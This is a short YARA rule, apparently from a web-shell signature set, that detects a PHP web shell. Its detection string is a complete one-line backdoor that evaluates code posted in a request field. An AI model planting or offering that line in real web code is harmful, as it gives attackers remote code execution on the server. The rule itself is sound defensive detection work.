rule webshell_webshells_new_xxxx {
  meta:
    author = Spider
    comment = None
    date = 2014/03/28
    description = Web shells - generated from file xxxx.php
    family = xxxx
    hacker = None
    hash = 5bcba70b2137375225d8eedcde2c0ebb
    judge = unknown
    license = https://creativecommons.org/licenses/by-nc/4.0/
    reference = None
    score = 70
    threatname = webshell[webshells]/new.xxxx
    threattype = webshells
  strings:
    $s0 = "<?php eval($_POST[1]);?>  " fullword
  condition:
    all of them
}